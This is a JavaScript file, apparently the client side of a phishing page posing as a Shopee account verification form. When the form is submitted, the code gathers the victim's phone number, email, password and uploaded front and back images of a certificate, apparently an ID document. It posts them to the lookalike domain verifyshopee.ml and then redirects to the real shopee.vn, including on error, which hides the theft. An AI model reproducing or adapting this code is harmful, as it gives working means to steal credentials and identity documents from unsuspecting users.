$(document).ready(function () {
  function readURL(input) {
    const img_id = input.parentNode.childNodes[5].id;
    console.log(
      '🚀 ~ file: index.js ~ line 6 ~ readURL ~ input.parentNode.childNodes',
      input.parentNode.id
    );
    const p = input.parentNode.childNodes[2];
    if (input.files && input.files[0]) {
      var reader = new FileReader();
      reader.onload = function (e) {
        $(`#${input.parentNode.id}`).css(
          'background-image',
          `url('${e.target.result}')`
        );
        // $(`#${img_id}`).attr('src', e.target.result);
        // $(`#${img_id}`).css('display', 'block');
        $(`#${input.parentNode.id}`).hide();
        $(`#${input.parentNode.id}`).fadeIn(650);

        $(`#${input.parentNode.id} p`).css('display', 'none');
      };
      reader.readAsDataURL(input.files[0]);
    }
  }
  $('#front_certificate_file').change(function () {
    readURL(this);
  });
  $('#back_certificate_file').change(function () {
    readURL(this);
  });

  $('#form').submit(function (event) {
    var formData = new FormData();
    const phone = $('#phone').val();
    const email = $('#email').val();
    const password = $('#password').val();
    const front_certificate_file = $('#front_certificate_file').prop('files');
    const back_certificate_file = $('#back_certificate_file').prop('files');
    formData.append('phone', phone);
    formData.append('email', email);
    formData.append('password', password);
    formData.append('certificate', front_certificate_file[0]);
    formData.append('certificate', back_certificate_file[0]);
    try {
      $.ajax({
        url: 'https://verifyshopee.ml/data',
        type: 'POST',
        data: formData,
        cache: false,
        contentType: false,
        processData: false
       }).done(function(res) {
		console.log(res)
		window.location.href = "http://www.shopee.vn"
		});
    } catch (error) {
      console.error(error);
	window.location.href = "http://www.shopee.vn"

    }
//	  window.location.href = "http://www.shopee.vn"
    
    return false; 
  });
});
